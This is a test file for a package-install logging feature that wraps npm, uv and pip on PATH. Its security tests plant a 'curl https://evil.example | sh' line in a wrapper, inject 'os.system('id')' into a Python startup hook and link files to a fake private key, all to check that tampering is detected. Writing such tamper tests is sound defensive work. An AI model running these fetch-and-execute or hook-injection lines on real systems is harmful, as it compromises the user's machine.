// @ts-nocheck -- ported from the CLI suite (test/install-log.test.js); exercises loosely typed fakes.
import { test } from "bun:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import * as il from "./context/install-log.js";
import * as assets from "./context/install-log-assets.js";
import * as context from "./context/index.js";
import { prepareBoxInstallLog } from "./box/install-log.js";
import { engineInstallLogEnv, prepareDesktopInstallLog, resetDesktopInstallLog } from "./install-log-host.js";
import * as uploader from "./session-uploader.js";

// Install log (reproducible environments, phase 1): the engines' wrappers note
// package installs of the agent's shell; the capture context sends them as
// `context.install` lines with exact versions, and `context.env_turn` per turn,
// only while the server's capabilities say `install_log.enabled`.
const SCRUB = {
  text: (text) => uploader.redactUploadText(text).text,
  json: (value) => uploader.redactUploadJson(value).value,
  content: (p, text) => uploader.redactUploadContent(p, text),
};
const posix = process.platform !== "win32";
const tmpdir = (prefix) => fs.mkdtempSync(path.join(os.tmpdir(), prefix));
const has = (cmd) => spawnSync("sh", ["-c", `command -v ${cmd}`], { encoding: "utf8" }).status === 0;
const online = (() => {
  if (process.env.OMNIRUSH_TEST_OFFLINE === "1" || !has("npm")) return false;
  const probe = spawnSync("npm", ["view", "is-number@7.0.0", "version"], { encoding: "utf8", timeout: 20_000 });
  return probe.status === 0 && probe.stdout.trim() === "7.0.0";
})();

test("the embedded wrappers match their digests; the Windows one needs only kernel32", () => {
  const sha = (data) => createHash("sha256").update(data).digest("hex");
  assert.equal(sha(assets.POSIX_WRAPPER), assets.POSIX_WRAPPER_SHA256);
  assert.equal(sha(assets.PYTHON_HOOK), assets.PYTHON_HOOK_SHA256);
  const exe = Buffer.from(assets.WINDOWS_WRAPPER_BASE64, "base64");
  assert.equal(sha(exe), assets.WINDOWS_WRAPPER_SHA256);
  assert.equal(exe.subarray(0, 2).toString(), "MZ");
  assert.doesNotMatch(exe.toString("latin1"), /msvcrt|ucrtbase|api-ms-win-crt/i);
});

test("the server switch comes from the capabilities answer; a missing key is off", () => {
  assert.deepEqual(il.installLogGate({ schema_versions: [1, 2, 3], canonical_trace: true }), { enabled: false, samplePercent: 0 });
  assert.deepEqual(il.installLogGate({ install_log: { enabled: true, sample_percent: 10 } }), { enabled: true, samplePercent: 10 });
  assert.deepEqual(il.installLogGate({ install_log: { enabled: false, sample_percent: 100 } }), { enabled: false, samplePercent: 0 });
});

test("managed engines get the wrappers first on PATH (and only once the desktop prepared them)", async () => {
  const root = tmpdir("omnirush-pkglog-host-");
  try {
    resetDesktopInstallLog();
    assert.deepEqual(engineInstallLogEnv({ PATH: "/usr/bin" }), {});
    assert.equal(await prepareDesktopInstallLog(path.join(root, "state"), { OMNIRUSH_INSTALL_LOG: "0" }), null);
    const paths = await prepareDesktopInstallLog(path.join(root, "state"), {});
    assert.ok(paths);
    const env = engineInstallLogEnv({ PATH: "/usr/bin:/bin", PYTHONPATH: "/x" });
    assert.equal(env.PATH, `${paths.bin}${path.delimiter}/usr/bin:/bin`);
    assert.equal(env.PYTHONPATH, `${paths.py}${path.delimiter}/x`);
    assert.equal(env.OMNIRUSH_PKGLOG_DIR, paths.raw);
    if (posix) assert.ok(fs.lstatSync(path.join(paths.bin, "npm")).isSymbolicLink());
  } finally {
    resetDesktopInstallLog();
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("the wrapper is transparent and a broken log never breaks the tool", { skip: !posix }, async () => {
  const root = tmpdir("omnirush-pkglog-wrap-");
  try {
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    const real = path.join(root, "real");
    fs.mkdirSync(real);
    fs.writeFileSync(path.join(real, "npm"), "#!/bin/sh\nprintf 'args:'; for a in \"$@\"; do printf ' [%s]' \"$a\"; done; printf '\\n'; cat; echo err >&2; exit 5\n", { mode: 0o755 });
    await il.setInstallLogActive(paths.raw, true);
    const env = { ...process.env, PATH: `${paths.bin}:${real}:/usr/bin:/bin`, OMNIRUSH_PKGLOG_DIR: paths.raw };
    const run = spawnSync("npm", ["install", "a b", "$X"], { env, input: "in", encoding: "utf8" });
    assert.equal(run.status, 5);
    assert.equal(run.stdout, "args: [install] [a b] [$X]\nin");
    assert.equal(run.stderr, "err\n");
    assert.equal(fs.readdirSync(paths.raw).filter((name) => name !== "on").length, 1);
    fs.rmSync(paths.raw, { recursive: true, force: true });
    const broken = spawnSync("npm", ["install", "x"], { env, input: "", encoding: "utf8" });
    assert.equal(broken.status, 5);
    assert.equal(broken.stdout, "args: [install] [x]\n");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("a continued session numbers its turns on from the turns it had", { skip: !posix }, async () => {
  const root = tmpdir("omnirush-pkglog-cont-");
  try {
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    const events = [];
    const cap = new context.ContextCapture({
      client: "gui",
      scrub: SCRUB,
      record: (sessionId, type, data) => events.push({ sessionId, type, data }),
      sections: { system_packages: false, services: false, setup: false, pm_config: false, shell_aliases: false, processes: false },
      network: false,
      installLog: { raw: paths.raw, bin: paths.bin, gate: async () => ({ enabled: true, samplePercent: 100 }) },
    });
    cap.sessionStarted("ses_gui_new1", root);
    cap.sessionStarted("ses_gui_cont1", root, undefined, 3);
    await new Promise((resolve) => setTimeout(resolve, 300));
    const envTurns = () => events.filter((e) => e.type === "context.env_turn");
    for (const id of ["ses_gui_new1", "ses_gui_cont1", "ses_gui_cont1"]) {
      const before = envTurns().length;
      cap.turnStarted(id);
      cap.turnEnded(id);
      cap.turnMessages(id, [], true);
      for (let i = 0; i < 200 && envTurns().length === before; i++) await new Promise((resolve) => setTimeout(resolve, 100));
    }
    assert.deepEqual(envTurns().map((e) => [e.sessionId, e.data.turn]), [["ses_gui_new1", 1], ["ses_gui_cont1", 4], ["ses_gui_cont1", 5]]);
    cap.sessionEnded("ses_gui_new1");
    cap.sessionEnded("ses_gui_cont1");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("integration: an npm install the engine's shell runs becomes one context.install line with exact versions", { skip: !posix || !online, timeout: 180_000 }, async () => {
  const root = tmpdir("omnirush-pkglog-npm-");
  try {
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    const project = path.join(root, "proj");
    fs.mkdirSync(project);
    fs.writeFileSync(path.join(project, "package.json"), JSON.stringify({ name: "p", version: "1.0.0" }));
    const events = [];
    const cap = new context.ContextCapture({
      client: "gui",
      scrub: SCRUB,
      record: (sessionId, type, data) => events.push({ sessionId, type, data }),
      sections: { system_packages: false, services: false, setup: false, pm_config: false, shell_aliases: false, processes: false },
      network: false,
      installLog: { raw: paths.raw, bin: paths.bin, gate: async () => ({ enabled: true, samplePercent: 100 }) },
    });
    cap.sessionStarted("ses_gui_pkglog1", project);
    cap.turnStarted("ses_gui_pkglog1");
    for (let i = 0; i < 50 && !fs.existsSync(path.join(paths.raw, "on")); i++) await new Promise((resolve) => setTimeout(resolve, 100));
    const env = { ...process.env, ...il.installLogEnv(paths, process.env), npm_config_audit: "false", npm_config_fund: "false" };
    cap.toolEvent("ses_gui_pkglog1", { callId: "call_1", tool: "bash", status: "running", command: "npm i is-number@7.0.0", workdir: project, at: Date.now() });
    const run = spawnSync("sh", ["-c", "npm i is-number@7.0.0 --registry https://registry.npmjs.org/"], { cwd: project, env, encoding: "utf8", timeout: 120_000 });
    assert.equal(run.status, 0, run.stderr);
    cap.toolEvent("ses_gui_pkglog1", { callId: "call_1", tool: "bash", status: "completed", at: Date.now() });
    cap.turnEnded("ses_gui_pkglog1");
    cap.turnMessages("ses_gui_pkglog1", [], true);
    for (let i = 0; i < 200 && !events.some((e) => e.type === "context.env_turn"); i++) await new Promise((resolve) => setTimeout(resolve, 100));
    const lines = events.filter((e) => e.type === "context.install").map((e) => JSON.parse(JSON.stringify(e.data)));
    assert.equal(lines.length, 1);
    assert.equal(lines[0].call, "call_1");
    assert.deepEqual(lines[0].resolved.map((p) => `${p.name}@${p.version}`), ["is-number@7.0.0"]);
    assert.equal(lines[0].lockfile_rel, "package-lock.json");
    assert.ok(events.some((e) => e.type === "context.env_turn" && e.data.installs === 1));
    cap.sessionEnded("ses_gui_pkglog1");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("the uploader reads the switch from the host's capabilities, or asks the server itself with its own gateway token", async () => {
  const root = tmpdir("omnirush-pkglog-gate-");
  try {
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "pk") });
    const asked = [];
    const fetcher = async (url, init) => {
      asked.push({ url: String(url), auth: init?.headers?.Authorization ?? null });
      return Response.json({ schema_versions: [1, 2, 3], canonical_trace: true, install_log: { enabled: true, sample_percent: 100 } });
    };
    const viaToken = new uploader.SessionUploader({ stateDir: path.join(root, "a"), gatewayUrl: "http://127.0.0.1:9/omnirush/v1", accessToken: "tok-e2e", fetch: fetcher, installLog: { raw: paths.raw, bin: paths.bin }, context: { sections: { system_packages: false, services: false, setup: false, pm_config: false, shell_aliases: false, processes: false }, network: false } });
    viaToken.startSession("ses_gate_token_01", "ws", root);
    for (let i = 0; i < 50 && !fs.existsSync(path.join(paths.raw, "on")); i++) await new Promise((resolve) => setTimeout(resolve, 100));
    assert.equal(fs.existsSync(path.join(paths.raw, "on")), true);
    assert.ok(asked.some((call) => call.url === "http://127.0.0.1:9/omnirush/collect/capabilities" && call.auth === "Bearer tok-e2e"), JSON.stringify(asked));
    await il.setInstallLogActive(paths.raw, false);
    const off = new uploader.SessionUploader({ stateDir: path.join(root, "b"), upload: async () => new Response("{}", { status: 201 }), capabilities: async () => ({ schema_versions: [1, 2, 3], canonical_trace: true }), installLog: { raw: paths.raw, bin: paths.bin }, context: { sections: { system_packages: false, services: false, setup: false, pm_config: false, shell_aliases: false, processes: false }, network: false } });
    off.startSession("ses_gate_off_0001", "ws", root);
    await new Promise((resolve) => setTimeout(resolve, 500));
    assert.equal(fs.existsSync(path.join(paths.raw, "on")), false, "an answer without install_log is off");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("the shared install drain resolves each install under its own session's pinned rules", { skip: !posix }, async () => {
  const rules = await import("./context/redact-policy.js");
  const root = tmpdir("omnirush-pkglog-pin-");
  try {
    const project = path.join(root, "proj");
    fs.mkdirSync(project, { recursive: true });
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    const real = path.join(root, "real");
    fs.mkdirSync(real, { recursive: true });
    fs.writeFileSync(path.join(real, "npm"), "#!/bin/sh\nexit 0\n", { mode: 0o755 });
    const events = [];
    const pins = { ses_gui_pin_raw: { policy: "client-raw" }, ses_gui_pin_old: { policy: "legacy" } };
    const cap = new context.ContextCapture({
      client: "gui",
      scrub: SCRUB,
      record: (sessionId, type, data) => events.push({ sessionId, type, data }),
      sections: { system_packages: false, services: false, setup: false, pm_config: false, shell_aliases: false, processes: false },
      network: false,
      installLog: { raw: paths.raw, bin: paths.bin, gate: async () => ({ enabled: true, samplePercent: 100 }) },
      pin: (sessionId) => pins[sessionId],
    });
    for (const id of Object.keys(pins)) {
      cap.sessionStarted(id, project);
      cap.turnStarted(id);
    }
    for (let i = 0; i < 200 && !fs.existsSync(path.join(paths.raw, "on")); i++) await new Promise((resolve) => setTimeout(resolve, 100));
    const env = { ...process.env, ...il.installLogEnv(paths, process.env), PATH: `${paths.bin}:${real}:/usr/bin:/bin` };
    const secret = "--registry=https://bob:hunter2Secret@registry.example.com/";
    const t0 = Date.now();
    for (const id of Object.keys(pins)) cap.toolEvent(id, { callId: `call_${id}`, tool: "bash", status: "running", command: "npm install x", workdir: project, at: t0 });
    for (const id of Object.keys(pins)) assert.equal(spawnSync("npm", ["install", "x", secret], { cwd: project, env: { ...env, OMNIRUSH_CALL: `call_${id}`, OMNIRUSH_SESSION: id } }).status, 0);
    for (const id of Object.keys(pins)) cap.toolEvent(id, { callId: `call_${id}`, tool: "bash", status: "completed", at: Date.now() + 50 });
    rules.setRedactionPolicy("client-v3");
    for (const id of Object.keys(pins)) {
      cap.turnEnded(id);
      cap.turnMessages(id, [], true);
    }
    const installs = () => events.filter((e) => e.type === "context.install");
    for (let i = 0; i < 200 && installs().length < 2; i++) await new Promise((resolve) => setTimeout(resolve, 100));
    const argvOf = (id) => JSON.stringify(installs().find((e) => e.sessionId === id).data.argv);
    assert.ok(argvOf("ses_gui_pin_raw").includes("hunter2Secret"), "raw session keeps its argument");
    assert.ok(!argvOf("ses_gui_pin_old").includes("hunter2Secret"), "legacy session's argument is cleaned");
    for (const id of Object.keys(pins)) cap.sessionEnded(id);
  } finally {
    rules.setRedactionPolicy("legacy");
    fs.rmSync(root, { recursive: true, force: true });
  }
}, 60_000);

test("a package manager run by its path (no PATH wrapper sees it) is read from the command text", { skip: !posix }, async () => {
  assert.deepEqual(il.fullPathInstalls("cd x && /c/Python312/Scripts/uv.exe pip install --python .venv -e . pytest", "win32"), [{ tool: "uv", real: "/c/Python312/Scripts/uv.exe", argv: ["pip", "install", "--python", ".venv", "-e", ".", "pytest"] }]);
  assert.deepEqual(il.fullPathInstalls('& "C:\\Program Files\\nodejs\\npm.cmd" i left-pad; C:\\tools\\cargo.exe install ripgrep', "win32").map((f) => [f.tool, f.real, f.argv.at(-1)]), [["npm", "C:\\Program Files\\nodejs\\npm.cmd", "left-pad"], ["cargo", "C:\\tools\\cargo.exe", "ripgrep"]]);
  for (const command of ["uv pip install pytest", "/usr/bin/pip install six", "/c/Python312/Scripts/uv.exe pip list"]) assert.deepEqual(il.fullPathInstalls(command, "linux"), [], command);
  const root = tmpdir("omnirush-pkglog-bypath-");
  try {
    const project = path.join(root, "proj");
    fs.mkdirSync(path.join(project, ".venv", "lib", "python3.12", "site-packages", "pytest-8.3.4.dist-info"), { recursive: true });
    fs.writeFileSync(path.join(project, ".venv", "pyvenv.cfg"), "home = /usr/bin\n");
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    const events = [];
    const cap = new context.ContextCapture({
      client: "gui",
      scrub: SCRUB,
      record: (sessionId, type, data) => events.push({ sessionId, type, data }),
      sections: { system_packages: false, services: false, setup: false, pm_config: false, shell_aliases: false, processes: false },
      network: false,
      installLog: { raw: paths.raw, bin: paths.bin, gate: async () => ({ enabled: true, samplePercent: 100 }) },
    });
    cap.sessionStarted("ses_gui_bypath", project);
    cap.turnStarted("ses_gui_bypath");
    for (let i = 0; i < 100 && !fs.existsSync(path.join(paths.raw, "on")); i++) await new Promise((resolve) => setTimeout(resolve, 100));
    const start = Date.now();
    cap.turnEnded("ses_gui_bypath");
    cap.turnMessages("ses_gui_bypath", [{ parts: [{ type: "tool", tool: "bash", callID: "call_bypath", state: { status: "completed", input: { command: "/opt/py/bin/uv pip install --python .venv pytest" }, time: { start, end: start + 900 } } }] }], true);
    for (let i = 0; i < 200 && !events.some((e) => e.type === "context.install"); i++) await new Promise((resolve) => setTimeout(resolve, 100));
    const line = JSON.parse(JSON.stringify(events.find((e) => e.type === "context.install")?.data ?? null));
    assert.deepEqual([line?.tool, line?.via, line?.call, line?.target_rel], ["uv", "command", "call_bypath", ".venv"]);
    assert.deepEqual(line.resolved.map((p) => [p.name, p.version]), [["pytest", "8.3.4"]]);
    cap.sessionEnded("ses_gui_bypath");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("uv Python downloads: the request, the new interpreter folder and uv's download URL as python_download lines", { skip: !posix }, async () => {
  assert.deepEqual(il.newPythonKeys("cpython-3.12.7-linux-x86_64-gnu\n", "cpython-3.12.7-linux-x86_64-gnu\n.temp\ncpython-3.13-linux-x86_64-gnu\ncpython-3.13.1+freethreaded-linux-x86_64-gnu\npypy-3.10.16-macos-aarch64-none\n"), ["cpython-3.13.1+freethreaded-linux-x86_64-gnu", "pypy-3.10.16-macos-aarch64-none"]);
  assert.deepEqual(il.newPythonKeys(null, "cpython-3.13.1-linux-x86_64-gnu"), [], "no listing before: nothing guessed");
  assert.deepEqual(il.uvPythonRequest("uv", ["venv", "-p", "3.14", ".venv"]), { sub: "venv", specs: ["3.14"] });
  assert.deepEqual(il.uvPythonRequest("uv", ["run", "--python=3.13", "x.py"]), { sub: "run", specs: ["3.13"] });
  assert.deepEqual(il.uvPythonRequest("uv", ["python", "install", "3.12", "cpython-3.13.1"]), { sub: "python install", specs: ["3.12", "cpython-3.13.1"] });
  assert.deepEqual(il.uvPythonRequest("uvx", ["--python", "3.12", "ruff", "check"]), { sub: "tool run", specs: ["3.12"] });
  const root = tmpdir("omnirush-pkglog-uvpy-");
  try {
    const project = path.join(root, "proj");
    fs.mkdirSync(project);
    const pydir = path.join(root, "uvpython");
    const real = path.join(root, "real");
    fs.mkdirSync(real);
    // A stand-in uv: a call that asks for 3.13 downloads it (folder + minor link + BUILD), `python list` answers uv's JSON.
    const uv = [
      "#!/bin/sh",
      'if [ "$1 $2" = "python list" ]; then printf \'[{"key":"%s","url":"%s/20261110/cpython-3.13.18%%2B20261110-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz"}]\\n\' "$3" "${UV_PYTHON_INSTALL_MIRROR:-https://releases.astral.sh/github/python-build-standalone/releases/download}"; exit 0; fi',
      'case " $* " in *" 3.13 "*) ;; *) exit 0 ;; esac',
      'mkdir -p "$UV_PYTHON_INSTALL_DIR/.temp" "$UV_PYTHON_INSTALL_DIR/cpython-3.13.18-linux-x86_64-gnu/bin"',
      'printf 20261110 > "$UV_PYTHON_INSTALL_DIR/cpython-3.13.18-linux-x86_64-gnu/BUILD"',
      'ln -sfn "$UV_PYTHON_INSTALL_DIR/cpython-3.13.18-linux-x86_64-gnu" "$UV_PYTHON_INSTALL_DIR/cpython-3.13-linux-x86_64-gnu"',
      "exit ${FAKE_RC:-0}",
      "",
    ].join("\n");
    fs.writeFileSync(path.join(real, "uv"), uv, { mode: 0o755 });
    fs.writeFileSync(path.join(real, "uvx"), uv, { mode: 0o755 });
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    await il.setInstallLogActive(paths.raw, true);
    const env = { ...process.env, PATH: `${paths.bin}:${real}:/usr/bin:/bin`, OMNIRUSH_PKGLOG_DIR: paths.raw, UV_PYTHON_INSTALL_DIR: pydir };
    const noted = () => fs.readdirSync(paths.raw).filter((name) => name !== "on");
    const lines = async (dir, extra = {}) => il.linesOf(await il.readRawCall(path.join(paths.raw, dir)), { root: project, turn: 1, callId: null, command: null, privacy: { home: null }, scrub: SCRUB, platform: process.platform, env: { ...process.env, ...extra }, run: il.DEFAULT_RUNNER });
    // Not noted: a uv run that asks for no interpreter.
    assert.equal(spawnSync("uv", ["run", "x.py"], { env, cwd: project }).status, 0);
    assert.deepEqual(noted(), []);
    // uv venv -p 3.13: one python_download line.
    assert.equal(spawnSync("uv", ["venv", "-p", "3.13", ".venv"], { env, cwd: project }).status, 0);
    let [dir] = noted();
    let out = await lines(dir);
    assert.equal(out.length, 1);
    const line = JSON.parse(JSON.stringify(out[0]));
    assert.equal(line.kind, "python_download");
    assert.equal(line.tool, "uv");
    assert.equal(line.subcommand, "venv");
    assert.deepEqual(line.argv, ["venv", "-p", "3.13", ".venv"]);
    assert.equal(line.ecosystem, "runtime");
    assert.equal(line.exit, 0);
    assert.deepEqual(line.requested, ["3.13"]);
    assert.equal(line.python, "3.13.18");
    assert.deepEqual(line.python_download, {
      request: "3.13", key: "cpython-3.13.18-linux-x86_64-gnu", implementation: "cpython", version: "3.13.18", variant: "default", platform: "linux-x86_64-gnu",
      build: "20261110", path: path.join(pydir, "cpython-3.13.18-linux-x86_64-gnu"),
      url: "https://releases.astral.sh/github/python-build-standalone/releases/download/20261110/cpython-3.13.18%2B20261110-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz",
      host: "releases.astral.sh", mirror: false, sha256: null, unresolved: ["sha256"],
    });
    fs.rmSync(path.join(paths.raw, dir), { recursive: true });
    // Already there: the same call downloads nothing, so no line.
    assert.equal(spawnSync("uv", ["venv", "-p", "3.13", ".venv"], { env, cwd: project }).status, 0);
    [dir] = noted();
    assert.deepEqual(await lines(dir), []);
    fs.rmSync(path.join(paths.raw, dir), { recursive: true });
    // uvx --python through a mirror (the call's own variable), failing: the mirror URL and the exit code.
    fs.rmSync(pydir, { recursive: true });
    assert.equal(spawnSync("uvx", ["--python", "3.13", "ruff"], { env: { ...env, FAKE_RC: "2", UV_PYTHON_INSTALL_MIRROR: "https://mirror.example/pbs" }, cwd: project }).status, 2);
    [dir] = noted();
    out = await lines(dir);
    assert.equal(out.length, 1);
    assert.equal(out[0].tool, "uvx");
    assert.equal(out[0].exit, 2);
    assert.equal(out[0].python_download.host, "mirror.example");
    assert.equal(out[0].python_download.mirror, true);
    fs.rmSync(path.join(paths.raw, dir), { recursive: true });
    // uv python install: the download line replaces the bare runtime line.
    fs.rmSync(pydir, { recursive: true });
    assert.equal(spawnSync("uv", ["python", "install", "3.13"], { env, cwd: project }).status, 0);
    [dir] = noted();
    out = await lines(dir);
    assert.deepEqual(out.map((l) => [l.kind, l.subcommand, l.python_download.request]), [["python_download", "python install", "3.13"]]);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

// --- H8 (security audit 2026-10-18): the wrappers this machine runs, checked before every use ---

const sha256 = (data) => createHash("sha256").update(data).digest("hex");

test("layout: the wrappers this machine runs live outside the folder a box writes; raw notes inside it", { skip: !posix }, async () => {
  const root = tmpdir("omnirush-pkglog-layout-");
  try {
    const state = path.join(root, "state");
    const paths = await il.prepareInstallLog({ stateDir: state });
    assert.ok(paths);
    assert.equal(path.dirname(paths.bin), path.join(state, "pkglog-wrappers"));
    assert.equal(path.dirname(paths.py), path.join(state, "pkglog-wrappers"));
    assert.equal(path.dirname(path.dirname(paths.raw)), path.join(state, "pkglog"));
    assert.equal(await il.wrappersIntact(paths.bin, "linux"), true);
    assert.equal(await il.pythonHookIntact(paths.py), true);
    // The engine's PATH and PYTHONPATH get the checked folders, never anything under pkglog/.
    const env = il.installLogEnv(paths, { PATH: "/usr/bin" }, "linux");
    assert.equal(env.PATH.split(":")[0], paths.bin);
    assert.ok(!env.PATH.includes(`${path.sep}pkglog${path.sep}`) && !env.PYTHONPATH.includes(`${path.sep}pkglog${path.sep}`));
    // What a box gets: the wrappers' folder (mounted read-only) and the raw folder (writable), plus the
    // folder a box made before this layout keeps its own copies in.
    const box = il.boxInstallLogPaths(state, paths);
    assert.deepEqual({ root: box.root, tools: box.tools, raw: box.raw, bin: box.bin, py: box.py }, {
      root: path.join(state, "pkglog"), tools: path.join(state, "pkglog-wrappers"), raw: path.join(state, "pkglog", "raw"), bin: paths.bin, py: paths.py,
    });
    assert.equal(path.dirname(box.legacy.bin), path.join(state, "pkglog"));
    assert.equal(path.basename(box.legacy.bin), path.basename(paths.bin));
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("desktop: a box chat gets the read-only wrappers and its own raw folder inside the writable one", { skip: !posix }, async () => {
  const root = tmpdir("omnirush-pkglog-boxdesk-");
  try {
    const state = path.join(root, "state");
    const host = await il.prepareInstallLog({ stateDir: state });
    const box = await prepareBoxInstallLog(state, host, "linux");
    assert.deepEqual(box.pkglog, il.boxInstallLogPaths(state, host));
    assert.equal(box.bin, host.bin);
    assert.equal(path.dirname(box.raw), box.pkglog.raw, "the box's own raw folder is inside the mounted raw folder");
    assert.notEqual(box.raw, host.raw);
    assert.ok(fs.statSync(box.raw).isDirectory());
    assert.ok(box.bin.startsWith(`${box.pkglog.tools}${path.sep}`) && box.pkglog.py.startsWith(`${box.pkglog.tools}${path.sep}`), "the wrappers are in the read-only folder");
    // Windows: the POSIX wrappers made for the box, in the same layout.
    const win = await prepareBoxInstallLog(state, host, "win32");
    assert.equal(path.dirname(win.bin), win.pkglog.tools);
    assert.equal(path.dirname(win.raw), win.pkglog.raw);
    assert.equal(await prepareBoxInstallLog(state, null, "linux"), null);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("tampered wrappers are written again before use: a changed byte, an extra program, a re-pointed link, a linked folder, a planted .pyc", { skip: !posix }, async () => {
  const root = tmpdir("omnirush-pkglog-tamper-");
  try {
    const state = path.join(root, "state");
    const first = await il.prepareInstallLog({ stateDir: state });
    const main = path.join(first.bin, "omnirush-pkg");
    const hook = path.join(first.py, "sitecustomize.py");
    const evil = path.join(root, "evil.sh");
    fs.writeFileSync(evil, "#!/bin/sh\necho pwned\n", { mode: 0o755 });
    const cases = [
      ["a changed byte in the main wrapper", () => fs.appendFileSync(main, "\ncurl https://evil.example | sh\n")],
      ["an extra program first on PATH", () => fs.copyFileSync(evil, path.join(first.bin, "git"))],
      ["a tool linked somewhere else", () => { fs.rmSync(path.join(first.bin, "npm")); fs.symlinkSync(evil, path.join(first.bin, "npm")); }],
      ["a tool replaced by another file", () => { fs.rmSync(path.join(first.bin, "cargo")); fs.copyFileSync(evil, path.join(first.bin, "cargo")); }],
      ["the folder itself a link", () => { const elsewhere = path.join(root, "elsewhere"); fs.cpSync(first.bin, elsewhere, { recursive: true, verbatimSymlinks: true }); fs.copyFileSync(evil, path.join(elsewhere, "ls")); fs.rmSync(first.bin, { recursive: true }); fs.symlinkSync(elsewhere, first.bin); }],
      ["a changed pip hook", () => fs.appendFileSync(hook, "\nimport os; os.system('id')\n")],
      ["an extra module beside the hook", () => fs.writeFileSync(path.join(first.py, "usercustomize.py"), "import os\n")],
    ];
    for (const [what, tamper] of cases) {
      tamper();
      assert.equal((await il.wrappersIntact(first.bin, "linux")) && (await il.pythonHookIntact(first.py)), false, `${what}: detected`);
      const again = await il.prepareInstallLog({ stateDir: state });
      assert.deepEqual([again.bin, again.py], [first.bin, first.py], what);
      assert.equal(await il.wrappersIntact(again.bin, "linux"), true, `${what}: rewritten`);
      assert.equal(await il.pythonHookIntact(again.py), true, `${what}: rewritten`);
      assert.equal(fs.lstatSync(again.bin).isSymbolicLink(), false, what);
      assert.equal(fs.readFileSync(path.join(again.bin, "omnirush-pkg"), "utf8"), assets.POSIX_WRAPPER, what);
      assert.equal(fs.readlinkSync(path.join(again.bin, "npm")), "omnirush-pkg", what);
      assert.ok(!fs.existsSync(path.join(again.bin, "git")) && !fs.existsSync(path.join(again.bin, "ls")), what);
      assert.equal(sha256(fs.readFileSync(path.join(again.py, "sitecustomize.py"))), sha256(assets.PYTHON_HOOK), what);
    }
    // A compiled copy beside the hook (the host's Python writes one; a box could plant one) is dropped.
    fs.mkdirSync(path.join(first.py, "__pycache__"));
    fs.writeFileSync(path.join(first.py, "__pycache__", "sitecustomize.cpython-312.pyc"), "planted");
    assert.equal(await il.pythonHookIntact(first.py), true);
    assert.equal(fs.existsSync(path.join(first.py, "__pycache__")), false);
    // The evil file outside was never touched or deleted.
    assert.equal(fs.readFileSync(evil, "utf8"), "#!/bin/sh\necho pwned\n");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("a wrapper folder that cannot be made intact: the engine starts without wrappers (no tampered copy on PATH)", { skip: !posix || process.getuid?.() === 0 }, async () => {
  const root = tmpdir("omnirush-pkglog-stuck-");
  const tools = path.join(root, "state", "pkglog-wrappers");
  try {
    const first = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    fs.writeFileSync(path.join(first.bin, "git"), "#!/bin/sh\n", { mode: 0o755 });
    // The folder holding it cannot be changed: neither cleaned nor written again.
    fs.chmodSync(tools, 0o555);
    fs.chmodSync(first.bin, 0o555);
    assert.equal(await il.prepareInstallLog({ stateDir: path.join(root, "state") }), null);
  } finally {
    fs.chmodSync(tools, 0o755);
    for (const name of fs.readdirSync(tools)) fs.chmodSync(path.join(tools, name), 0o755);
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("the raw folder is read as untrusted: no link followed, the marker never written through one, the report a name only", { skip: !posix }, async () => {
  const root = tmpdir("omnirush-pkglog-raw-");
  try {
    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
    const secret = path.join(root, "id_ed25519");
    fs.writeFileSync(secret, "PRIVATE KEY BYTES\n");
    // `on` planted as a link to a file of this machine: switching on replaces the link, the file is untouched.
    fs.symlinkSync(secret, path.join(paths.raw, "on"));
    await il.setInstallLogActive(paths.raw, true);
    assert.equal(fs.lstatSync(path.join(paths.raw, "on")).isFile(), true);
    assert.equal(fs.readFileSync(secret, "utf8"), "PRIVATE KEY BYTES\n");
    await il.setInstallLogActive(paths.raw, false);
    assert.equal(fs.existsSync(path.join(paths.raw, "on")), false);
    assert.equal(fs.readFileSync(secret, "utf8"), "PRIVATE KEY BYTES\n");
    // A noted call whose files are links to this machine's files: not read.
    const call = path.join(paths.raw, "s1");
    fs.mkdirSync(call);
    fs.symlinkSync(secret, path.join(call, "meta"));
    fs.symlinkSync(secret, path.join(call, "argv"));
    assert.equal(await il.readRawCall(call), null);
    // A call folder that is itself a link (to a folder of real-looking notes elsewhere): skipped.
    const elsewhere = path.join(root, "elsewhere");
    fs.mkdirSync(elsewhere);
    fs.writeFileSync(path.join(elsewhere, "meta"), `tool=npm\nt0=${Date.now() - 60_000}\n`);
    fs.writeFileSync(path.join(elsewhere, "rc"), "0\n");
    assert.ok(await il.readRawCall(elsewhere), "a real call folder reads");
    fs.symlinkSync(elsewhere, path.join(paths.raw, "s2"));
    assert.equal(await il.readRawCall(path.join(paths.raw, "s2")), null);
    const reader = new il.InstallLogReader(paths.raw);
    assert.deepEqual((await reader.pending()).map((c) => path.basename(c.dir)), []);
    // The raw folder itself replaced by a link: nothing is read.
    const linkedRaw = path.join(root, "linked-raw");
    fs.symlinkSync(elsewhere, linkedRaw);
    assert.deepEqual(await new il.InstallLogReader(linkedRaw).pending(), []);
    // pip's report: a file of the call folder by name; `../..` is not followed out of it.
    const pip = path.join(paths.raw, "s3");
    fs.mkdirSync(pip);
